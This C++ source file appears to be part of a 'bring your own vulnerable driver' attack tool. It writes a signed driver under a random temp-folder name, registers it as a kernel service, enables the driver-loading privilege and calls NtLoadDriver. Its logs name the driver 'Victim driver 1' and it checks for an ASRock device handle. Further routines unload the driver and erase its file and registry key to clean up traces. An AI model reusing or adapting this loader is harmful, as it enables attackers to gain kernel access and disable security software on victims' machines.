#include "load_signed.h"

#pragma warning(disable : 4996)

BOOL load_signed::SetupByteFile()
{
	std::ifstream file("C:\\Users\\lands\\OneDrive\\Documents\\bytefile.txt");

	std::stringstream ss;
	ss << file.rdbuf(); // read the entire file into a stringstream
	std::string byteString = ss.str();

	for (size_t i = 0; i < byteString.size(); i += 3) { // read byte string separated by spaces
		std::string byteString16 = byteString.substr(i, 2);
		unsigned char byte = std::stoi(byteString16, nullptr, 16); // convert the byte string to unsigned char
		std::cout << "0x" << std::setw(2) << std::setfill('0') << std::hex << (int)byte << ", "; // print out the byte in the desired format

		if ((i + 3) % 48 == 0) { // start a new line after every 16 bytes
			std::cout << std::endl;
		}
	}
	std::cout << std::endl;
	return 0;
}

bool load_signed::ReadFileToMemory(const char* FilePath, void*& OutputBuffer)
{
	// Check if the file exists
	if (!GetFileAttributesA(FilePath)) return false;
	std::ifstream File(FilePath, std::ios::binary | std::ios::ate);

	// Check if we actually opened the file
	if (File.fail()) return false;

	auto FileSize = File.tellg(); // Get the size of the path
	void* Buffer = VirtualAlloc(NULL, FileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// If we failed to allocate the buffer, close the file and return
	if (!Buffer || Buffer == nullptr) {
		File.close();
		return false;
	}

	// Set the file pointer to the start
	File.seekg(NULL, std::ios::beg);
	File.read((char*)Buffer, FileSize);
	File.close();
	OutputBuffer = Buffer;
	return true;
}

bool load_signed::WriteFileToMemory(const char* DesiredFilePath, const char* Address, SIZE_T Size)
{
	// Check if the size of the file is valid
	if (!Size) return false;

	// Open the desired file path in output mode
	std::ofstream File(DesiredFilePath, std::ios::binary | std::ios::ate);

	// Write the file to memory with the bytes
	if (!File.write(Address, Size)) {
		File.close();
		return false;
	}

	// Close the file and return true if the operation succeeded
	File.close();
	return true;
}

std::string load_signed::GetTemporaryLocation()
{
	char Buffer[MAX_PATH];
	GetTempPathA(MAX_PATH, Buffer);
	return std::string(Buffer);
}

std::string load_signed::GetDriverName()
{
	srand(time(0));
	const char* alphanumeric = "abcdefghijklmnopqrstuvwxyz1234567890";
	std::string driver_name = "constantstringlength";
	for (int j = 0; j < driver_name.size(); j++) {
		driver_name[j] = alphanumeric[rand() % strlen(alphanumeric)];
	}
	return driver_name;
}

std::string load_signed::GetDriverPath()
{
	return GetTemporaryLocation().append(GetDriverName());
}

bool load_signed::IsDriverRunning()
{
	const HANDLE DriverStatus = CreateFileA("\\\\.\\AsrOmgDrv", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (DriverStatus != nullptr && DriverStatus != INVALID_HANDLE_VALUE)
	{
		CloseHandle(DriverStatus);
		return true;
	}
	return false;
}

bool load_signed::RegisterSignedDriver(const char* DriverPath, const char* DriverName)
{

	if (load_signed::IsDriverRunning()) {
		logOutput::LogSuccess("Victim driver 1 running already!!");
		return true;
	}

	const static unsigned long ServiceKernelType = 1;
	std::string ServicePath = std::string("SYSTEM\\CurrentControlSet\\Services\\").append(DriverName);
	std::string typePath = std::string("\\??\\").append(DriverPath);

	// Create a registry key for our signed driver
	HKEY DriverServiceKey;
	LSTATUS status = RegCreateKeyA(HKEY_LOCAL_MACHINE, ServicePath.c_str(), &DriverServiceKey);
	if (status != ERROR_SUCCESS) {
		logOutput::LogErrorGLA("Can't create registry key", GetLastError());
		return false;
	}

	// Change the imagepath key value for our driver
	status = RegSetKeyValueA(DriverServiceKey, NULL, "ImagePath", REG_EXPAND_SZ, typePath.c_str(), strlen(typePath.c_str()));
	if (status != ERROR_SUCCESS) {
		// Close the registry key if we failed to change the value
		RegCloseKey(DriverServiceKey);
		logOutput::LogError("Can't set registry key value");
		return false;
	}

	// Change the type key value for our driver
	status = RegSetKeyValueA(DriverServiceKey, NULL, "Type", REG_DWORD, &ServiceKernelType, sizeof(unsigned
		long));

	if (status != ERROR_SUCCESS) {
		RegCloseKey(DriverServiceKey);
		logOutput::LogError("Failed to change the type key value to Kernel type for signed driver");
		return false;
	}

	RegCloseKey(DriverServiceKey);

	// Load the ntdll module
	HMODULE pModule = GetModuleHandleA("ntdll.dll");
	if (pModule == NULL)
	{
		logOutput::LogError("Unable to load ntdll module");
		return false;
	}

	// Make sure administrator is running for this part
	auto RtlAdjustPriviledge = (prototypes::RtlAdjustPrivilege)GetProcAddress(pModule, "RtlAdjustPrivilege");
	auto NtLoadDriver = (prototypes::NtLoadDriver)GetProcAddress(pModule, "NtLoadDriver");

	// Check if those function pointers are valid
	if (!RtlAdjustPriviledge || !NtLoadDriver)
	{
		logOutput::LogError("Cannot retrieve required functions");
		return false;
	}

	// Adjust the privleges so we can load the signed driver
	unsigned long SeLoadDriverPrivilege = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS StatusCode;

	StatusCode = RtlAdjustPriviledge(SeLoadDriverPrivilege, TRUE, FALSE, &SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(StatusCode)) {
		logOutput::LogError("Unable to adjust privleges");
		return false;
	}

	std::string DriverRegistryPath =
		std::string("\\Registry\\Machine\\System\\CurrentControlSet\\Services\\").append(DriverName);


	// Convert std::string to std::wstring
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring wstrpath = converter.from_bytes(DriverRegistryPath);


	// Initialise the unicode string
	UNICODE_STRING ServicesStrUnicode;
	RtlInitUnicodeString(&ServicesStrUnicode, wstrpath.c_str());


	// Load the signed driver into memory
	StatusCode = NtLoadDriver(&ServicesStrUnicode);
	logOutput::LogSuccessStatus("NtLoadDriver status: ", StatusCode);

	// Check if the signed driver has already been loaded into memory
	if (StatusCode == 0xC000010E) {
		logOutput::LogError("Signed driver already running");
		return true;
	}

	return NT_SUCCESS(StatusCode);
}

bool load_signed::UnloadSignedDriver(const char* DriverName)
{
	// Get the native dll module
	HMODULE pModule = GetModuleHandleA("ntdll.dll");
	if (pModule == NULL) {
		logOutput::LogError("Error retrieving specified module");
		return false;
	}

	// Get the path of the driver
	std::string DriverRegistryPath =
		std::string("\\Registry\\Machine\\System\\CurrentControlSet\\Services\\").append(DriverName);

	// Get the service path of our driver in unicode form
	UNICODE_STRING servicesStringUnicode;

	std::wstring_convert<std::codecvt_utf8<wchar_t>> Converter;
	std::wstring WStringUnicode = Converter.from_bytes(std::string(DriverRegistryPath));

	RtlInitUnicodeString(&servicesStringUnicode, WStringUnicode.c_str());

	HKEY DriverServicesKey;
	std::string pathOfServices = std::string("SYSTEM\\CurrentControlSet\\Services\\").append(DriverName);

	LSTATUS LStatusCode = RegOpenKeyA(HKEY_LOCAL_MACHINE, pathOfServices.c_str(), &DriverServicesKey);


	if (LStatusCode != ERROR_SUCCESS) {
		// If the file is not found, it has not already been loaded into memory/ is not running
		if (LStatusCode == ERROR_FILE_NOT_FOUND) {
			logOutput::LogSuccess("NtUnloadDriver Call postponed");
			RegDeleteKeyA(HKEY_LOCAL_MACHINE, pathOfServices.c_str());
			DeleteFileA(GetDriverPath().c_str());
			return true;
		}
		return false;
	}


	auto NtUnloadDriver = (prototypes::NtUnloadDriver)GetProcAddress(pModule, "NtUnloadDriver");
	NTSTATUS StatusCode = NtUnloadDriver(&servicesStringUnicode);

	logOutput::LogSuccessStatus("NtUnloadDriver status: ", StatusCode);
	if (StatusCode != 0x0) {
		logOutput::LogError("Driver unload failed");
		StatusCode = RegDeleteKeyA(HKEY_LOCAL_MACHINE, pathOfServices.c_str());
		return false;
	}
	

	logOutput::LogMessage("Deleting registry key for victim driver one....");
	StatusCode = RegDeleteKeyA(HKEY_LOCAL_MACHINE, pathOfServices.c_str());

	RegCloseKey(DriverServicesKey);
	DeleteFileA(load_signed::GetDriverPath().c_str());
	remove(load_signed::GetDriverPath().c_str());

	if (StatusCode != ERROR_SUCCESS) return false;
	return true;
}